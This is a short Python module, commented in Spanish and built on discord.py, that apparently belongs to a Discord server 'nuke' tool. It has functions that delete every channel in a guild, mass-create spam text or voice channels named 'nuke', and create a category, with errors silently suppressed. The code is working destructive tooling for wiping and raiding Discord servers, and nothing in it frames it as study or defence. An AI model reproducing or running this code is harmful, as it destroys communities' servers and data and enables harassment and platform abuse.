"""Operaciones sobre canales."""
from __future__ import annotations

import discord

from .utils import human, pool


async def destroy_channels(guild: discord.Guild, *, concurrency: int = 4, log=print) -> int:
    channels = list(guild.channels)
    log(f"Borrando {human(len(channels))} canales...")
    await pool(channels, lambda ch, _i: ch.delete(reason="nuke"), concurrency)
    return len(channels)


async def spam_channels(guild, count: int, *, kind: str = "text", name: str = "nuke",
                        category=None, concurrency: int = 3, log=print) -> int:
    log(f"Creando {human(count)} canales...")
    counter = {"n": 0}

    async def create(index):
        label = f"{name}-vc-{index}" if kind == "voice" else f"{name}-{index}"
        try:
            if kind == "voice":
                await guild.create_voice_channel(label, category=category, reason="nuke")
            else:
                await guild.create_text_channel(label, category=category, reason="nuke")
            counter["n"] += 1
        except Exception:
            pass

    await pool(range(1, count + 1), lambda item, _i: create(item), concurrency)
    return counter["n"]


async def create_category(guild, name: str):
    try:
        return await guild.create_category(name, reason="nuke")
    except Exception:
        return None
